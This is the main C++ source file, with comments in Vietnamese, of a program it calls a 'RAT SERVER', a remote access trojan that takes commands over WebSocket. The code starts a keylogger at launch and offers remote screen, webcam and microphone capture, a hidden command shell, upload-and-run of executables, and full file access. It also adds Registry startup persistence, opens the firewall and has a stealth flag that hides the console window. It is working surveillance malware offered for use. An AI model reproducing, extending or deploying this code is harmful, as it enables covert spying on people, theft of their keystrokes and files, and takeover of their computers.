// =================================================================================
// ⚙️ CẤU HÌNH HIỂN THỊ CONSOLE
// =================================================================================
// ✅ SHOW_CONSOLE = true  → Hiện cửa sổ console (dùng khi debug/development)
// ❌ SHOW_CONSOLE = false → Ẩn console (dùng khi deploy/stealth mode)
#define SHOW_CONSOLE true
// =================================================================================

#if !SHOW_CONSOLE
    // Dòng này giấu cửa sổ Console đi ngay khi khởi động (Không hiện màn hình đen)
    #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#endif

#include "Global.h"
#include "SystemManager.h"
#include "Keylogger.h"
#include "MediaManager.h"
#include "CmdTerminal.h"
#include "FileManager.h"

// Tắt cảnh báo biên dịch không cần thiết
#pragma warning(push)
#pragma warning(disable : 4267) // Tắt cảnh báo size_t to int
#pragma warning(disable : 4244) // Tắt cảnh báo mất dữ liệu số
#pragma warning(disable : 4996) // Tắt cảnh báo deprecated
#pragma warning(disable : 26812) // Tắt cảnh báo enum class 

// --- HÀM XỬ LÝ SỰ KIỆN NHẬN TIN NHẮN TỪ CLIENT ---
void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr msg) {
    std::string payload = msg->get_payload();

    try {
        // Parse dữ liệu JSON từ Client gửi lên
        auto j_req = json::parse(payload);

        // Kiểm tra xem gói tin có chứa lệnh "cmd" không
        if (j_req.contains("cmd")) {
            std::string cmd = j_req["cmd"];
            json j_res; // Biến JSON để chứa kết quả trả về

            // =============================================================
            // 1. NHÓM LỆNH: PROCESS (QUẢN LÝ TIẾN TRÌNH)
            // =============================================================
            if (cmd == "LIST_PROC") {
                j_res["data"] = GetProcessList();
                j_res["type"] = "LIST_RESULT";
            }
            else if (cmd == "KILL_PROC") {
                // Xử lý diệt theo PID (Số)
                if (j_req.contains("pid")) {
                    int pid = std::stoi(j_req["pid"].get<std::string>());
                    bool success = KillProcessByPID(pid);

                    if (success) {
                        j_res["msg"] = "THÀNH CÔNG: Đã diệt Process có PID: " + std::to_string(pid);
                    }
                    else {
                        j_res["msg"] = "THẤT BẠI: Không tìm thấy PID: " + std::to_string(pid) + " hoặc quyền truy cập bị từ chối.";
                    }
                }
                // Xử lý diệt theo Tên (Chuỗi)
                else if (j_req.contains("proc_name")) {
                    std::string name = j_req["proc_name"];
                    int count = KillProcessByName(name);

                    if (count > 0) {
                        j_res["msg"] = "THÀNH CÔNG: Đã diệt tổng cộng " + std::to_string(count) + " tiến trình có tên: " + name;
                    }
                    else {
                        j_res["msg"] = "THẤT BẠI: Không tìm thấy tiến trình có tên: " + name;
                    }
                }
                j_res["type"] = "ACTION_RESULT";
            }

            else if (cmd == "START_PROC") {
                std::string name = j_req["name"];
                // Giả định StartApp trong SystemManager.cpp trả về bool (>32 là thành công)
                bool success = StartApp(name);

                if (success) {
                    j_res["msg"] = "THÀNH CÔNG: Đã khởi chạy ứng dụng/web: " + name;
                }
                else {
                    j_res["msg"] = "THẤT BẠI: Không thể mở '" + name + "'. Kiểm tra tên hoặc đường dẫn.";
                }
                j_res["type"] = "ACTION_RESULT";
            }

            // =============================================================
            // 2. NHÓM LỆNH: SYSTEM (HỆ THỐNG)
            // =============================================================
            else if (cmd == "SYSTEM_CONTROL") {
                std::string type = j_req["type"];
                SystemControl(type);
                j_res["msg"] = "Da thuc thi lenh he thong: " + type;
                j_res["type"] = "ACTION_RESULT";
            }

            else if (cmd == "PERSISTENCE") {
                std::string mode = j_req["mode"]; // "ON" hoặc "OFF"
                bool ok = false;

                if (mode == "ON") {
                    ok = InstallStartup();
                    j_res["msg"] = ok ? "DA CAI DAT: Server se tu chay khi bat may." : "LOI: Khong the ghi Registry.";
                }
                else {
                    ok = RemoveStartup();
                    j_res["msg"] = ok ? "DA GO BO: Server se khong tu chay nua." : "LOI: Khong tim thay hoac khong the xoa Registry.";
                }
                j_res["type"] = "ACTION_RESULT";
            }

            else if (cmd == "CHECK_PERSISTENCE") {
                bool isEnabled = CheckStartupExists();
                j_res["enabled"] = isEnabled;
                j_res["msg"] = isEnabled ? "Persistence is ENABLED" : "Persistence is DISABLED";
                j_res["type"] = "PERSISTENCE_STATUS";
            }

            // =============================================================
            // 2.5. NHÓM LỆNH: SERVER INFO
            // =============================================================
            else if (cmd == "GET_SERVER_IP") {
                std::string serverIP = GetLocalIPAddress();
                j_res["ip"] = serverIP;
                j_res["port"] = "9002";
                j_res["msg"] = "Server IP: " + serverIP;
                j_res["type"] = "SERVER_INFO";
            }

            // =============================================================
            // 3. NHÓM LỆNH: KEYLOGGER (BÀN PHÍM)
            // =============================================================
            else if (cmd == "START_KEYLOG") {
                // Khóa luồng để thao tác an toàn với biến toàn cục
                std::lock_guard<std::mutex> lock(g_LogMutex);

                g_KeylogBuffer = ""; // Xóa sạch dữ liệu cũ
                g_PendingModifiers.clear(); // Reset trạng thái phím

                j_res["msg"] = "Da xoa bo nho dem (Reset Keylog)";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "GET_KEYLOG") {
                std::lock_guard<std::mutex> lock(g_LogMutex);

                j_res["data"] = g_KeylogBuffer; // Lấy dữ liệu
                g_KeylogBuffer = "";            // Xóa sau khi lấy để tránh trùng lặp
                j_res["type"] = "KEYLOG_RESULT";
            }
            else if (cmd == "SET_KEYLOG_MODE") {
                if (j_req.contains("mode")) {
                    std::string mode = j_req["mode"];
                    if (mode == "buffer" || mode == "realtime") {
                        std::lock_guard<std::mutex> lock(g_LogMutex);
                        g_KeylogMode = mode;
                        j_res["msg"] = "Keylog mode đã chuyển sang: " + mode;
                        j_res["currentMode"] = g_KeylogMode;
                    }
                    else {
                        j_res["msg"] = "Chế độ không hợp lệ. Chỉ chấp nhận: buffer hoặc realtime";
                    }
                }
                else {
                    // Nếu không có tham số, trả về chế độ hiện tại
                    j_res["currentMode"] = g_KeylogMode;
                    j_res["msg"] = "Chế độ hiện tại: " + g_KeylogMode;
                }
                j_res["type"] = "ACTION_RESULT";
            }

            // =============================================================
            // 4. NHÓM LỆNH: MEDIA (HÌNH ẢNH & CAMERA)
            // =============================================================
            else if (cmd == "SCREENSHOT") {
                // Chụp màn hình và nhận về chuỗi Base64
                int monitorIndex = j_req.contains("monitorIndex") ? j_req["monitorIndex"].get<int>() : -1;
                std::string base64Img = CaptureScreenBase64(monitorIndex);

                j_res["data"] = base64Img;
                j_res["type"] = "SCREENSHOT_RESULT";
            }
            else if (cmd == "SCAN_MONITORS") {
                std::string monitorList = ScanAvailableMonitors();
                j_res["data"] = json::parse(monitorList);
                j_res["type"] = "MONITOR_LIST";
            }
            else if (cmd == "START_SCREEN") {
                if (g_IsStreamingScreen) {
                    j_res["msg"] = "Screen is already streaming";
                }
                else {
                    int monitorIndex = j_req.contains("monitorIndex") ? j_req["monitorIndex"].get<int>() : -1;
                    StartScreenStream(s, hdl, monitorIndex);
                    j_res["msg"] = "Screen streaming started (Monitor " + std::to_string(monitorIndex) + ")";
                }
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "STOP_SCREEN") {
                StopScreenStream();
                j_res["msg"] = "Screen streaming stopped";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "SCAN_CAMERAS") {
                std::string cameraList = ScanAvailableCameras();
                j_res["data"] = json::parse(cameraList);
                j_res["type"] = "CAMERA_LIST";
            }
            else if (cmd == "START_CAM") {
                if (g_IsStreaming) {
                    j_res["msg"] = "Webcam is running";
                }
                else {
                    int camIndex = j_req.contains("cameraIndex") ? j_req["cameraIndex"].get<int>() : 0;
                    StartWebcamStream(s, hdl, camIndex);
                    j_res["msg"] = "Webcam Started (Camera " + std::to_string(camIndex) + ")";
                }
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "STOP_CAM") {
                g_IsStreaming = false; // Đổi cờ hiệu, luồng Webcam sẽ tự thoát vòng lặp

                // [FIX]: Thêm độ trễ 200ms để luồng Webcam kịp thời giải phóng tài nguyên.
                std::this_thread::sleep_for(std::chrono::milliseconds(200));

                j_res["msg"] = "Da gui lenh dung Webcam...";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "RECORD_CAM") {
                if (g_IsStreaming) {
                    j_res["msg"] = "Loi: Hay tat Stream truoc!";
                }
                else {
                    int duration = j_req.contains("duration") ? j_req["duration"].get<int>() : 10;
                    int camIndex = j_req.contains("cameraIndex") ? j_req["cameraIndex"].get<int>() : 0;
                    StartRecordVideo(s, hdl, duration, camIndex);
                    j_res["msg"] = "Dang khoi dong camera de ghi hinh... (Camera " + std::to_string(camIndex) + ")";
                }
                j_res["type"] = "ACTION_RESULT";
            }

            // =============================================================
            // 4.5. NHÓM LỆNH: MICROPHONE
            // =============================================================
            else if (cmd == "SCAN_MICS") {
                std::string micList = ScanAvailableMicrophones();
                j_res["data"] = json::parse(micList);
                j_res["type"] = "MIC_LIST";
            }
            else if (cmd == "START_MIC") {
                if (g_IsStreamingAudio) {
                    j_res["msg"] = "Microphone is already running";
                }
                else {
                    int micIndex = j_req.contains("micIndex") ? j_req["micIndex"].get<int>() : 0;
                    StartMicStream(s, hdl, micIndex);
                    j_res["msg"] = "Microphone Started (Mic " + std::to_string(micIndex) + ")";
                }
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "STOP_MIC") {
                StopMicStream();
                j_res["msg"] = "Microphone stopped";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "RECORD_MIC") {
                if (g_IsStreamingAudio) {
                    j_res["msg"] = "Error: Stop live audio first!";
                }
                else {
                    int duration = j_req.contains("duration") ? j_req["duration"].get<int>() : 10;
                    int micIndex = j_req.contains("micIndex") ? j_req["micIndex"].get<int>() : 0;
                    RecordMicAudio(s, hdl, duration, micIndex);
                    j_res["msg"] = "Recording audio from Mic " + std::to_string(micIndex) + " for " + std::to_string(duration) + "s...";
                }
                j_res["type"] = "ACTION_RESULT";
            }

            // =============================================================
            // 5. NHÓM LỆNH: CMD TERMINAL
            // =============================================================
            else if (cmd == "CMD_START") {
                bool showWindow = j_req.contains("showWindow") ? j_req["showWindow"].get<bool>() : false;
                bool success = StartCmdSession(showWindow);
                
                if (success) {
                    j_res["msg"] = "CMD session started";
                    j_res["running"] = true;
                }
                else {
                    j_res["msg"] = "Failed to start CMD or session already running";
                    j_res["running"] = false;
                }
                j_res["type"] = "CMD_STATUS";
            }
            else if (cmd == "CMD_EXEC") {
                std::string command = j_req["command"];
                SendCmdCommand(command);
                j_res["msg"] = "Command sent";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "CMD_STOP") {
                StopCmdSession();
                j_res["msg"] = "CMD session stopped";
                j_res["running"] = false;
                j_res["type"] = "CMD_STATUS";
            }
            else if (cmd == "CMD_KILL") {
                TerminateCmdProcess();
                j_res["msg"] = "CMD process terminated forcefully";
                j_res["running"] = false;
                j_res["type"] = "CMD_STATUS";
            }
            else if (cmd == "CMD_RUN_FILE") {
                std::string filePath = j_req["filePath"];
                bool showWindow = j_req.contains("showWindow") ? j_req["showWindow"].get<bool>() : false;
                bool success = RunExecutableFile(filePath, showWindow);
                
                if (success) {
                    j_res["msg"] = "File execution started: " + filePath;
                    j_res["running"] = true;
                }
                else {
                    j_res["msg"] = "Failed to execute file: " + filePath;
                    j_res["running"] = false;
                }
                j_res["type"] = "CMD_STATUS";
            }
            else if (cmd == "CMD_STATUS") {
                j_res["running"] = g_CmdRunning;
                j_res["showWindow"] = g_CmdShowWindow;
                j_res["type"] = "CMD_STATUS";
            }
            else if (cmd == "CMD_UPLOAD_RUN") {
                std::string filename = j_req["filename"];
                std::string fileData = j_req["fileData"];
                bool showWindow = j_req.contains("showWindow") ? j_req["showWindow"].get<bool>() : false;
                
                // Decode base64
                std::string decoded = Base64Decode(fileData);
                
                // Save to temp directory
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string filePath = std::string(tempPath) + "rat_uploads\\";
                CreateDirectoryA(filePath.c_str(), NULL);
                filePath += filename;
                
                // Write file
                std::ofstream outFile(filePath, std::ios::binary);
                if (outFile.is_open()) {
                    outFile.write(decoded.c_str(), decoded.size());
                    outFile.close();
                    
                    // Run the file
                    bool success = RunExecutableFile(filePath, showWindow);
                    if (success) {
                        j_res["msg"] = "File uploaded and executed: " + filename;
                        j_res["running"] = true;
                    }
                    else {
                        j_res["msg"] = "File uploaded but failed to execute: " + filename;
                        j_res["running"] = false;
                    }
                }
                else {
                    j_res["msg"] = "Failed to save file: " + filename;
                    j_res["running"] = false;
                }
                j_res["type"] = "CMD_STATUS";
            }

            // =============================================================
            // 6. NHÓM LỆNH: FILE MANAGER
            // =============================================================
            else if (cmd == "LIST_DIR") {
                std::string path = j_req["path"];
                std::string result = ListDirectory(path);
                j_res = json::parse(result);
                j_res["type"] = "DIR_LIST";
            }
            else if (cmd == "GET_DIR_TREE") {
                std::string path = j_req["path"];
                std::string result = GetDirectoryStructure(path);
                j_res = json::parse(result);
                j_res["type"] = "DIR_TREE";
            }
            else if (cmd == "CREATE_FILE") {
                std::string path = j_req["path"];
                std::string content = j_req.contains("content") ? j_req["content"].get<std::string>() : "";
                bool success = CreateNewFile(path, content);
                
                // Verify file was created and is accessible
                if (success) {
                    std::error_code ec;
                    if (!fs::exists(path, ec) || ec) {
                        success = false;
                    } else {
                        // Try to read it back to verify
                        std::ifstream test(path, std::ios::binary);
                        if (!test.is_open()) {
                            success = false;
                        } else {
                            test.close();
                        }
                    }
                }
                
                j_res["success"] = success;
                j_res["msg"] = success ? "File created successfully" : "Failed to create file";
                j_res["type"] = "ACTION_RESULT";
                j_res["path"] = path;
            }
            else if (cmd == "CREATE_FOLDER") {
                std::string path = j_req["path"];
                bool success = CreateNewFolder(path);
                j_res["success"] = success;
                j_res["msg"] = success ? "Folder created successfully" : "Failed to create folder";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "DELETE_ITEM") {
                std::string path = j_req["path"];
                bool success = DeleteFileOrFolder(path);
                j_res["success"] = success;
                j_res["msg"] = success ? "Item deleted successfully" : "Failed to delete item";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "RENAME_ITEM") {
                std::string oldPath = j_req["oldPath"];
                std::string newPath = j_req["newPath"];
                bool success = RenameFileOrFolder(oldPath, newPath);
                j_res["success"] = success;
                j_res["msg"] = success ? "Item renamed successfully" : "Failed to rename item";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "READ_FILE") {
                std::string path = j_req["path"];
                std::string content = ReadFileContent(path);
                
                // Check if content is valid UTF-8
                bool isText = !content.empty() && IsValidUTF8(content);
                
                if (isText) {
                    // Safe to send as text
                    j_res["content"] = content;
                    j_res["encoding"] = "utf8";
                } else if (!content.empty()) {
                    // Binary file - encode as Base64
                    std::string base64 = ReadFileAsBase64(path);
                    j_res["content"] = base64;
                    j_res["encoding"] = "base64";
                } else {
                    // Empty file
                    j_res["content"] = "";
                    j_res["encoding"] = "utf8";
                }
                
                j_res["success"] = !content.empty() || fs::file_size(path) == 0;
                j_res["type"] = "FILE_CONTENT";
            }
            else if (cmd == "WRITE_FILE") {
                std::string path = j_req["path"];
                std::string content = "";
                
                // Check if content exists and is not null
                if (j_req.contains("content") && !j_req["content"].is_null()) {
                    content = j_req["content"].get<std::string>();
                }
                
                bool success = WriteFileContent(path, content);
                j_res["success"] = success;
                j_res["msg"] = success ? "File saved successfully" : "Failed to save file";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "DOWNLOAD_FILE") {
                std::string path = j_req["path"];
                std::string base64Data = ReadFileAsBase64(path);
                j_res["data"] = base64Data;
                j_res["success"] = !base64Data.empty();
                j_res["filename"] = fs::path(path).filename().string();
                j_res["type"] = "FILE_DOWNLOAD";
            }
            else if (cmd == "UPLOAD_FILE") {
                std::string path = j_req["path"];
                std::string base64Data = "";
                
                // Check if data exists and is not null
                if (j_req.contains("data") && !j_req["data"].is_null()) {
                    base64Data = j_req["data"].get<std::string>();
                }
                
                if (base64Data.empty()) {
                    j_res["success"] = false;
                    j_res["msg"] = "No data provided for upload";
                    j_res["type"] = "ACTION_RESULT";
                } else {
                    bool success = WriteFileFromBase64(path, base64Data);
                    
                    // Verify file was created and is accessible
                    if (success) {
                        std::error_code ec;
                        if (!fs::exists(path, ec) || ec) {
                            success = false;
                        } else {
                            // Verify file size
                            uintmax_t size = fs::file_size(path, ec);
                            if (ec || size == 0) {
                                success = false;
                            }
                        }
                    }
                    
                    j_res["success"] = success;
                    j_res["msg"] = success ? "File uploaded successfully" : "Failed to upload file";
                    j_res["type"] = "ACTION_RESULT";
                    j_res["path"] = path;
                }
            }
            else if (cmd == "GET_FILE_INFO") {
                std::string path = j_req["path"];
                std::string result = GetFileInfo(path);
                j_res = json::parse(result);
                j_res["type"] = "FILE_INFO";
            }

            // =============================================================
            else if (cmd == "KILL_SERVER") {
                j_res["msg"] = "Server da nhan lenh tu huy. Tam biet!";
                j_res["type"] = "ACTION_RESULT";

                // Gửi tin nhắn phản hồi trước khi chết để Client biết
                s->send(hdl, j_res.dump(), msg->get_opcode());

                // Tạo một luồng riêng để thực hiện hành động tắt sau 1 giây
                // (Phải đợi 1s để tin nhắn trên kịp gửi đi qua mạng)
                std::thread([]() {
                std::this_thread::sleep_for(std::chrono::seconds(1));
                exit(0); // Lệnh tắt chương trình ngay lập tức
                }).detach();

            // Không break, để nó chạy xuống cuối hàm cho đúng logic (dù sắp tắt)
            }

            // =============================================================
            // GỬI PHẢN HỒI VỀ CLIENT
            // =============================================================
            j_res["status"] = "OK";

            // Chuyển JSON thành chuỗi và gửi đi
            s->send(hdl, j_res.dump(), websocketpp::frame::opcode::text);
        }
    }
    catch (std::exception& e) {
        std::cout << "[ERROR] Loi xu ly tin nhan: " << e.what() << std::endl;
    }
    catch (...) {
        std::cout << "[ERROR] Loi khong xac dinh!" << std::endl;
    }
}

// --- SỰ KIỆN KHI CÓ KẾT NỐI MỚI ---
void on_open(server* s, websocketpp::connection_hdl hdl) {
    std::cout << ">>> Client CONNECTED (Ket noi thanh cong)" << std::endl;
    
    // Lưu thông tin connection để dùng cho real-time keylog
    g_ClientHdl = hdl;
    g_ClientConnected = true;
}

// --- SỰ KIỆN KHI NGẮT KẾT NỐI ---
void on_close(server* s, websocketpp::connection_hdl hdl) {
    std::cout << "<<< Client DISCONNECTED (Ngat ket noi)" << std::endl;
    
    // Reset connection state
    g_ClientConnected = false;
}

// =================================================================================
// HÀM MAIN (CHƯƠNG TRÌNH CHÍNH)
// =================================================================================
int main() {
    // 1. Cấu hình DPI (Để chụp màn hình độ phân giải cao không bị cắt)
    SetProcessDPIAware();

    // Tự động mở cổng Firewall ngay khi chạy
    // Lưu ý: Cần chạy với quyền Admin để lệnh này có tác dụng
    SetupFirewall();

    // 2. Khởi tạo GDI+ (Thư viện đồ họa Windows)
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    //std::string myIP = GetLocalIPAddress();
    //std::cout << ">>> DETECTED LAN IP: " << myIP << std::endl;
    //// Ghi ra file để xem(vì Stealth Mode sẽ ẩn console)
    //std::ofstream ipFile("server_ip.txt");
    //if (ipFile.is_open()) {
    //    ipFile << "Server IP Address: " << myIP << "\n";
    //    ipFile << "Port: 9002\n";
    //    ipFile << "Copy IP nay va nhap vao Web Client.";
    //    ipFile.close();
    //}

    std::cout << "==========================================" << std::endl;
    std::cout << "   RAT SERVER                             " << std::endl;
    std::cout << "   Port: 9002                             " << std::endl;
    std::cout << "==========================================" << std::endl;

    // 3. Khởi động Keylogger (Chạy ngầm ngay lập tức)
    StartKeyloggerThread();

    // 4. Khởi tạo Server WebSocket
    server echo_server;
    g_ServerPtr = &echo_server; // Lưu con trỏ để dùng trong keylogger

    try {
        // Tắt bớt log rác để màn hình console sạch sẽ
        echo_server.clear_access_channels(websocketpp::log::alevel::all);

        // Khởi tạo ASIO
        echo_server.init_asio();

        // Đăng ký các hàm xử lý sự kiện
        echo_server.set_message_handler(bind(&on_message, &echo_server, std::placeholders::_1, std::placeholders::_2));
        echo_server.set_open_handler(bind(&on_open, &echo_server, std::placeholders::_1));
        echo_server.set_close_handler(bind(&on_close, &echo_server, std::placeholders::_1));

        // Lắng nghe cổng 9002
        echo_server.listen(9002);

        // Bắt đầu chấp nhận kết nối
        echo_server.start_accept();

        // Vòng lặp chính (Chương trình sẽ chạy mãi ở đây)
        echo_server.run();
    }
    catch (std::exception const& e) {
        std::cout << "[FATAL ERROR] Loi Server: " << e.what() << std::endl;
    }

    // 5. Dọn dẹp tài nguyên khi tắt chương trình
    GdiplusShutdown(gdiplusToken);

    return 0;
}